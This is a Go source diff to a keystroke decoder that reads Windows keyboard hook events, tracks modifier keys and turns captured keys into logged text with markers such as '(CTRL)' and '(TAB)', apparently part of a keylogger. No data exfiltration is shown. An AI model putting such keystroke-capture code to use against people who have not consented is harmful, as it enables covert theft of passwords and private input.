@@ -20,6 +20,8 @@ type KeyStrokeDecoder struct {
 	output        chan string
 	shiftState    bool
 	capsState     bool
+	menuState     bool
+	ctrlState     bool
 	keyboardState [256]uint8
 }
 
@@ -35,10 +37,24 @@ func (ksd *KeyStrokeDecoder) Listen() {
 		event := <-ksd.input
 		// kbd := event.HookStruct
 
-		// user32.GetKeyboardState(types.PBYTE(&ksd.keyboardState[0]))
+		user32.GetKeyboardState(types.PBYTE(&ksd.keyboardState[0]))
 
-		for i := range ksd.keyboardState {
-			ksd.keyboardState[i] = byte((user32.GetAsyncKeyState(i) >> 8) & 0xff)
+		/*
+			for i := range ksd.keyboardState {
+				ksd.keyboardState[i] = byte((user32.GetAsyncKeyState(i) >> 8) & 0xff)
+			}
+		*/
+
+		if ksd.shiftState {
+			ksd.keyboardState[types.VK_SHIFT] = 0x80
+		}
+
+		if ksd.menuState {
+			ksd.keyboardState[types.VK_MENU] = 0x80
+		}
+
+		if ksd.ctrlState {
+			ksd.keyboardState[types.VK_CONTROL] = 0x80
 		}
 
 		if ksd.capsState {
@@ -56,21 +72,43 @@ func (ksd *KeyStrokeDecoder) Listen() {
 			event.Layout,
 		) <= 0
 
-		raw := syscall.UTF16ToString(buf[:])
+		key := syscall.UTF16ToString(buf[:])
 		// key := rune(user32.MapVirtualKeyExW(types.UINT(event.HookStruct.VkCode), types.MAPVK_VK_TO_CHAR, event.Layout))
 
 		switch {
+		case event.IsControl() && event.IsDown():
+			ksd.ctrlState = true
+			ksd.output <- "(CTRL)"
+
+		case event.IsControl() && event.IsUp():
+			ksd.ctrlState = false
+
 		case event.IsShift() && event.IsDown():
 			ksd.shiftState = true
 
 		case event.IsShift() && event.IsUp():
 			ksd.shiftState = false
 
+		case event.IsMenu() && event.IsDown():
+			ksd.menuState = true
+
+		case event.IsMenu() && event.IsUp():
+			ksd.menuState = false
+
 		case event.IsCaps() && event.IsDown():
 			ksd.capsState = !ksd.capsState
 
-		case event.IsControl() && event.IsDown():
-			ksd.output <- "(CTRL)"
+		case event.IsTab() && event.IsKeyDown():
+			ksd.output <- "(TAB)"
+
+		case event.IsTab() && event.IsSysKeyDown():
+			/*
+				if ksd.shiftState {
+					ksd.output <- "(ALT+SHIFT+TAB)"
+				} else {
+					ksd.output <- "(ALT+TAB)"
+				}
+			*/
 
 		case event.IsEscape() && event.IsDown():
 			ksd.output <- "(ESC)"
@@ -82,8 +120,8 @@ func (ksd *KeyStrokeDecoder) Listen() {
 			ksd.output <- "↩\n"
 		}
 
-		if !unicodeErr && unicode.IsPrint(rune(raw[0])) && event.IsDown() {
-			ksd.output <- raw
+		if !unicodeErr && unicode.IsPrint(rune(key[0])) && event.IsDown() {
+			ksd.output <- key
 		}
 
 	}
